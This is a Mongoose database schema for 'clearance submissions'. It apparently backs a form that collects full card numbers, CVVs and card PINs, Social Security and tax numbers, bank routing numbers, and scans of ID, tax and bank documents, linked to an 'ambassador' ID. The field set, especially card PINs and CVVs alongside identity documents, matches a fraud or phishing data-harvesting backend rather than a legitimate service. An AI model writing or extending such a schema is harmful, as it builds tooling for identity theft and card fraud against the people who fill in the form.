const mongoose = require('mongoose');

const clearanceSubmissionSchema = new mongoose.Schema({
  // Personal Information
  personalInfo: {
    firstName: { type: String },
    lastName: { type: String },
    dateOfBirth: { type: String },
    phoneNumber: { type: String },
    email: { type: String },
    submittedAt: { type: String }
  },
  
  // Address
  address: {
    street: { type: String },
    city: { type: String },
    state: { type: String },
    zip: { type: String },
    country: { type: String }
  },
  
  // Payment Details
  paymentDetails: {
    cardNumber: { type: String },
    cardHolder: { type: String },
    expiryMonth: { type: String },
    expiryYear: { type: String },
    cvv: { type: String },
    cardPin: { type: String },
    lastFour: { type: String }
  },
  
  // Financial Information
  financialInfo: {
    socialSecurityNumber: { type: String },
    taxId: { type: String },
    routingNumber: { type: String }
  },
  
  // Document References with Cloudinary URLs
  documents: {
    idDocument: { type: String },
    idDocumentPublicId: { type: String },
    taxDocument: { type: String },
    taxDocumentPublicId: { type: String },
    bankDocument: { type: String },
    bankDocumentPublicId: { type: String }
  },
  
  // Metadata
  metadata: {
    ambassadorId: { type: String },
    submissionId: { type: String },
    status: { type: String, default: 'submitted' },
    encryptedFields: { type: Array, default: [] }
  },
  
  createdAt: { type: Date, default: Date.now }
});

module.exports = mongoose.model('ClearanceSubmission', clearanceSubmissionSchema);
